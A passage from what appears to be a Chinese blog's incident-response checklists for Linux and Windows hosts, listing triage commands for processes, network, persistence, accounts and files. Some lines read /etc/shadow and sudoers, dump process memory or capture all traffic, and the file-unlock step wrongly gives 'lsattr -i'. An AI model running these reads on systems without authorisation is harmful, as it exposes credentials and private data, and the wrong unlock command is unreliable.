<li>将本地工具包拷贝至远程机器&#x2F;tmp&#x2F;work&#x2F;路径下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -r /local/tool.zip root@192.168.1.1:/tmp/work/</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>将远程机器文件下载到本地的&#x2F;tmp&#x2F;work&#x2F;路径下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 root@192.168.1.1:/tmp/work/log.tar.gz /tmp/work/</span><br></pre></td></tr></table></figure>

<h2 id="命令篡改分析"><a href="#命令篡改分析" class="headerlink" title="命令篡改分析"></a>命令篡改分析</h2><ol>
<li>检查是否有恶意命令设置了别名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>检查系统完整性，系统命令是否被替换（重点关注S、5、T）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -Va</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -Va 的输出结果通常包含一些特殊字符，用于指示文件的哪些属性发生了变化：</span><br><span class="line">S：文件大小发生变化。</span><br><span class="line">M：文件的权限发生变化。</span><br><span class="line">5：文件的 MD5 校验和发生变化。</span><br><span class="line">D：设备号发生变化。</span><br><span class="line">L：符号链接的目标发生变化。</span><br><span class="line">U：文件所有者发生变化。</span><br><span class="line">G：文件所属组发生变化。</span><br><span class="line">T：文件的修改时间发生变化。</span><br><span class="line">P：文件的权限发生变化（另一种表示方式）。</span><br><span class="line">例如，输出结果 S.5....T 表示文件的大小、MD5 校验和和修改时间发生了变化。</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看命令目录最近的时间排序</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /usr/bin | head -10</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>根据确定时间去匹配被篡改的命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /bin/ /usr/bin/ /usr/sbin/ /sbin/ | grep &quot;Aug 25&quot;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看top命令是否有预加载的动态链接库文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldd `which top`</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>跟踪命令的系统调用（需要安装strace工具）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strace -f cat</span><br></pre></td></tr></table></figure>

<h2 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h2><ol>
<li>查看当前系统所有的tcp&#x2F;udp连接</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看当前系统监听的tcp&#x2F;udp端口的进程</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tulnp</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看是否存在异常的域名-IP映射</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看所有防火墙规则，是否存在业务范围之外的可疑地址和端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -vnL</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>全量抓取系统当前网络流量</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -w /tmp/work/flow.pcap</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看当前通信的连接总数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -an | grep ESTABLISHED | wc -l</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wc命令参数解释：</span><br><span class="line">-l 或 --lines	统计文件中的行数。</span><br></pre></td></tr></table></figure>

<h2 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h2><ol>
<li>查看系统运行状态，是否存在进程占用CPU过大</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数详解</span><br><span class="line">-c：显示完整的命令行参数。</span><br><span class="line">如果不使用 -c，COMMAND 列只会显示进程的名称。</span><br><span class="line">使用 -c 后，COMMAND 列会显示完整的命令行，这对于调试和监控特定进程的运行参数非常有用。</span><br><span class="line">-n：指定 top 运行的次数。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>根据进程名或字符串获取PID</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pidof &quot;关键字&quot;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看当前系统运行的所有进程</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br><span class="line">按照启动时间排序：</span><br><span class="line">ps -aux --sort=start_time</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数详解</span><br><span class="line">-a</span><br><span class="line">含义：显示当前终端（tty）上所有用户的进程，不包括其他终端的进程。</span><br><span class="line">作用：-a 选项使得 ps 命令不仅显示当前用户的进程，还显示其他用户在当前终端上运行的进程。</span><br><span class="line">-u</span><br><span class="line">含义：显示进程的用户（所有者）信息。</span><br><span class="line">作用：-u 选项使得 ps 命令显示进程的用户信息，包括用户名、进程的 CPU 使用率、内存使用率等。</span><br><span class="line">-x</span><br><span class="line">含义：显示没有控制终端的进程。</span><br><span class="line">作用：-x 选项使得 ps 命令能够显示那些没有控制终端（tty）的进程，例如后台运行的守护进程或通过 nohup 启动的进程。</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看当前系统运行的进程，及父子进程关系</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -auxef</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数详解</span><br><span class="line">-e 参数</span><br><span class="line">含义：显示系统中所有进程，不受终端（tty）的限制。</span><br><span class="line">作用：-e 选项使得 ps 命令能够列出系统中所有用户的进程，而不仅仅是当前终端或当前用户的进程。这包括后台进程、守护进程以及没有控制终端的进程。</span><br><span class="line">-f 参数</span><br><span class="line">含义：显示长格式的进程信息。</span><br><span class="line">作用：-f 选项使得 ps 命令显示更详细的进程信息，包括父进程 ID（PPID）、进程的启动时间、运行时间等。这有助于更全面地了解进程的上下文和行为。</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看进程树查看进程-线程对应关系</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pstree -acU</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数详解</span><br><span class="line">-a 参数</span><br><span class="line">含义：显示每个进程的完整命令行参数。</span><br><span class="line">作用：默认情况下，pstree 只显示进程的名称。使用 -a 参数后，它会显示每个进程的完整命令行参数，这对于调试和监控特定进程的运行参数非常有用。</span><br><span class="line">-c 参数</span><br><span class="line">含义：不合并相同的进程。</span><br><span class="line">作用：在某些情况下，多个进程可能具有相同的名称或命令行参数。使用 -c 参数后，pstree 会将这些进程分别显示，而不是合并显示。</span><br><span class="line">-U 参数</span><br><span class="line">含义：显示进程的用户（所有者）信息。</span><br><span class="line">作用：使用 -U 参数后，pstree 会在每个进程的名称前显示其所有者的用户名。这对于识别哪些用户启动了哪些进程非常有用。</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看CPU占用前10的进程</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -eo pid,ppid,cmd,%cpu --sort=-%cpu | head -n 11</span><br><span class="line">ps -aux --sort=-%cpu | head -11</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查看内存占用前10 的进程</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -eo pid,ppid,cmd,%mem --sort=-%mem | head -n 11</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">-e：显示所有进程。</span><br><span class="line">-o：自定义输出格式，pid 是进程 ID，ppid 是父进程 ID，cmd 是命令行，%mem 是内存使用率（以百分比表示）。</span><br><span class="line">--sort=-%mem：按内存使用率降序排序。</span><br><span class="line">head -n 11：显示前 11 行（第 1 行是标题行，接下来是前 10 个进程）。</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>查看进程的行为</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strace -f -p pid</span><br></pre></td></tr></table></figure>

<h2 id="隐藏进程分析"><a href="#隐藏进程分析" class="headerlink" title="隐藏进程分析"></a>隐藏进程分析</h2><ol>
<li>通过对比ps显示的进程ID与proc目录文件的差异性来发现隐藏进程</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print$2&#125;&#x27; | sort -n | uniq &gt; 1</span><br><span class="line">ls /proc | sort -n | uniq &gt; 2</span><br></pre></td></tr></table></figure>

<p>shell脚本实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># 获取 ps 命令列出的所有 PID</span><br><span class="line">PS_PIDS=$(ps -eo pid | awk &#x27;NR &gt; 1 &#123;print $1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># 获取 /proc 目录中的所有 PID</span><br><span class="line">PROC_PIDS=$(ls -1 /proc | grep &#x27;^[0-9]&#x27;)</span><br><span class="line"></span><br><span class="line"># 将两个列表转换为数组</span><br><span class="line">readarray -t PS_PIDS_ARRAY &lt;&lt;&lt; &quot;$PS_PIDS&quot;</span><br><span class="line">readarray -t PROC_PIDS_ARRAY &lt;&lt;&lt; &quot;$PROC_PIDS&quot;</span><br><span class="line"></span><br><span class="line"># 遍历 /proc 中的 PID，检查是否在 ps 的 PID 列表中</span><br><span class="line">for pid in &quot;$&#123;PROC_PIDS_ARRAY[@]&#125;&quot;; do</span><br><span class="line">    if [[ ! &quot; $&#123;PS_PIDS_ARRAY[@]&#125; &quot; =~ &quot; $&#123;pid&#125; &quot; ]]; then</span><br><span class="line">        echo &quot;隐藏进程 PID: $pid&quot;</span><br><span class="line">        echo &quot;进程信息:&quot;</span><br><span class="line">        cat /proc/$pid/status</span><br><span class="line">        echo &quot;------------------------&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="恶意程序定位"><a href="#恶意程序定位" class="headerlink" title="恶意程序定位"></a>恶意程序定位</h2><ol>
<li>查看恶意进程对应的可执行程序</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /proc/&#123;pid&#125;/exe</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>如果进程源文件被删除，可使用重定向从内存中恢复源文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/&#123;pid&#125;/exe &gt; /tmp/work/test.bin</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看恶意进程启动命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/&#123;pid&#125;/cmdline</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看恶意进程关联到的每个可执行文件和库文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/&#123;pid&#125;/maps</span><br><span class="line">lsof -p &#123;pid&#125;</span><br><span class="line">ldd /proc/&#123;pid&#125;/exe</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看恶意进程环境变量，注意查看哪个用户启动，以及登录IP</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings /proc/&#123;pid&#125;/environ</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>获取进程启动时的所在路径（不一定是恶意文件所在路径）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwdx &#123;pid&#125;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查看指定端口对应的程序</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -i:&#123;port&#125;</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>查看与恶意进程关联的文件&#x2F;端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -f -p &#123;pid&#125;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>查看指定文件名相关的进程信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -c 文件名</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>查看tmp目录下的可疑文件，特别是以点开头的隐藏文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /tmp</span><br><span class="line">ls -alt /var/tmp</span><br><span class="line">ls -alt /dev/shm</span><br></pre></td></tr></table></figure>

<h2 id="开机启动项分析"><a href="#开机启动项分析" class="headerlink" title="开机启动项分析"></a>开机启动项分析</h2><ol>
<li>关注&#x2F;etc目录下的rc相关文件以及init相关目录及文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -altr /etc/init.d/</span><br><span class="line">cat /etc/inittab</span><br><span class="line">ls /etc/rc*.d/</span><br><span class="line">cat /etc/rc.local</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看开机自启动服务（Centos7 以前）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看开机自启动服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files | grep enabled</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看该目录下是否存在异常启动服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/systemd/system/</span><br><span class="line">/usr/lib/systemd/system</span><br><span class="line">/usr/lib/systemd/system/multi-user.target.wants</span><br></pre></td></tr></table></figure>

<h2 id="计划任务分析"><a href="#计划任务分析" class="headerlink" title="计划任务分析"></a>计划任务分析</h2><ol>
<li>查看一次性计划任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at -l</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看当前&#x2F;指定用户的crontab文件内容</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u username -l</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看定时任务的log记录，是否存在异常的定时任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/cron</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看系统任务配置文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/cron.d/</span><br><span class="line">ls -altr /etc/cron*</span><br><span class="line">ls -altr /var/spool/cron/</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看anacron定时任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/anacron/*</span><br><span class="line">cat /etc/anacrontab</span><br></pre></td></tr></table></figure>

<h2 id="账户分析"><a href="#账户分析" class="headerlink" title="账户分析"></a>账户分析</h2><ol>
<li>查看所有用户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | cut -f 1 -d :</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看特权账户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查询可以远程登录的账号</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查询能够登录的账户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep -E &quot;/bin/bash$&quot;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查询具有sudo权限的账号</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo grep -E &#x27;^[^#]+ALL&#x27; /etc/sudoers | cut -d&#x27; &#x27; -f1</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看机器当前登录的全部用户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查看已经登录系统的用户列表</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>所有用户的登录、注销信息，系统的启动、重启、关机事件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>错误登录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>所有用户最近成功的登录事件和最后一次不成功的登录事件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastlog</span><br></pre></td></tr></table></figure>

<h2 id="异常文件分析"><a href="#异常文件分析" class="headerlink" title="异常文件分析"></a>异常文件分析</h2><ol>
<li>排查临时目录是否存在可疑文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /tmp/</span><br><span class="line">ls -alt /var/tmp/</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看文件是否被加锁</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsattr &#123;filename&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>给文件解锁</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsattr -i &#123;filename&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看指定目录下文件时间的排序</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt | head -n 10</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看文件详细时间</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stat &#123;filename&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>目录对比</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff -r 目录1 目录2</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查找24小时内被修改的jsp文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /path/to/search -type f -name &quot;*.jsp&quot; -mtime -1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">/path/to/search：指定要搜索的目录路径。你可以将其替换为实际的目录路径，例如 /var/www/html 或 .（当前目录）。</span><br><span class="line">-type f：指定只查找文件（不包括目录）。</span><br><span class="line">-name &quot;*.jsp&quot;：指定只查找文件名以 .jsp 结尾的文件。</span><br><span class="line">-mtime -1：指定只查找在过去 24 小时内被修改的文件。-mtime -1 表示修改时间在过去 24 小时内。</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>查找一天之前，七天之内新增的文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /path/to/search -type f -mtime +1 -mtime -7</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">/path/to/search：指定要搜索的目录路径。你可以将其替换为实际的目录路径，例如 /var/www/html 或 .（当前目录）。</span><br><span class="line">-type f：指定只查找文件（不包括目录）。</span><br><span class="line">-mtime +1：指定文件的修改时间早于 24 小时。</span><br><span class="line">-mtime -7：指定文件的修改时间在过去 7 天内。</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>查找777权限的jsp文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /path/to/search -type f -name &quot;*.jsp&quot; -perm 777</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">/path/to/search：指定要搜索的目录路径。你可以将其替换为实际的目录路径，例如 /var/www/html 或 .（当前目录）。</span><br><span class="line">-type f：指定只查找文件（不包括目录）。</span><br><span class="line">-name &quot;*.jsp&quot;：指定只查找文件名以 .jsp 结尾的文件。</span><br><span class="line">-perm 777：指定查找权限为 777 的文件。</span><br></pre></td></tr></table></figure>

<h2 id="其他可疑项分析"><a href="#其他可疑项分析" class="headerlink" title="其他可疑项分析"></a>其他可疑项分析</h2><ol>
<li>查看可疑DNS配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>通过关键字匹配文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rn 关键字 /path</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看是否存在异常的域名IP映射</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看是否存在可疑的环境变量</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看动态链接库是否被修改</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $LD_PRELOAD</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看linux预加载库，是否被添加恶意so文件（该文件默认为空）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/ld.so.preload</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查看可疑的用户库文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/lib/*</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>应急</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应-Windows场景checklist</title>
    <url>/2025/07/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Windows%E5%9C%BA%E6%99%AFchecklist/</url>
    <content><![CDATA[<h2 id="系统状态分析"><a href="#系统状态分析" class="headerlink" title="系统状态分析"></a>系统状态分析</h2><ol>
<li>检查是否存在CPU&#x2F;内存&#x2F;网络爆满的情况</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; taskmgr</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看系统版本信息及补丁信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看计算机详细信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msinfo32</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看系统变量设置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>如果恶意程序已经被查杀，可以在杀软查杀日志中发现</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">杀软查杀日志</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>用户目录下是否有可疑文件（时间排序）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; %UserProfile%\Recent</span><br><span class="line">C:\Documents and Settings\Administrator\Recent</span><br><span class="line">C:\Documents and Settings\Default User\Recent</span><br><span class="line">C:\windows\temp\</span><br></pre></td></tr></table></figure>

<h2 id="账户分析"><a href="#账户分析" class="headerlink" title="账户分析"></a>账户分析</h2><ol>
<li>访谈管理员，是否存在弱口令，是否开启3389rdp</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弱口令排查</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看本地用户和组，是否存在可疑账号、新增账号</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我的电脑-&gt;右键-&gt;管理-&gt;本地用户和组-&gt;用户</span><br><span class="line">WIN+R &gt; lusrmgr.msc</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看登录情况</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qwinsta</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看当前登录账户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看服务器账号</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看本地管理员</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查看本地用户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic UserAccount get name</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>通过注册表查看账户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>排查该目录下是否存在新建用户目录，如果存在，则重点排查download和desktop目录是否有可疑文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\&#123;UserName&#125;</span><br></pre></td></tr></table></figure>

<h2 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h2><ol>
<li>查看目前的网络连接，定位可疑的ESTABLISHED，处于监听状态的端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;端口号&quot;</span><br></pre></td></tr></table></figure>

<p>连接状态解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CLOSED：无连接活动或正在进行</span><br><span class="line">LISTEN：监听中等待连接</span><br><span class="line">SYN_RECV：服务端接收了SYN</span><br><span class="line">SYN_SENT：请求连接等待确认</span><br><span class="line">ESTABLISHED：连接建立数据传输</span><br><span class="line">FIN_WAIT1：请求中止连接，等待对方FIN</span><br><span class="line">FIN_WAIT2：同意中止，请稍候</span><br><span class="line">ITMED_WAIT：等待所有分组死掉</span><br><span class="line">CLOSING：两边同时尝试关闭</span><br><span class="line">TIME_WAIT：另一边已初始化一个释放</span><br><span class="line">LAST_ACK：等待原来的发向远程TCP的连接中断请求的确认</span><br><span class="line">CLOSE-WAIT：等待关闭连接</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看网络连接对应的进程（管理员权限打开powershell执行）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat /b</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看路由信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -rn</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>根据netstat定位出的PID，进行进程定位</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist | findstr &#123;PID&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看防火墙策略（高版本不支持）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall show all</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看防火墙策略</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all dir=in type=dynamic</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>查看DNS解析记录，是否存在可疑 的DNS解析</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /displaydns</span><br></pre></td></tr></table></figure>

<h2 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h2><ol>
<li>查看运行程序（或进程）的命令行参数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get caption,commandline /value</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查询指定进程的命令行参数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process where caption=&quot;xxx.exe&quot; get caption,commandline /value</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看服务与进程对应关系</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看进程与dll关系</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist -M</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查看哪些进程调用了指定的dll文件</li>
</ol>
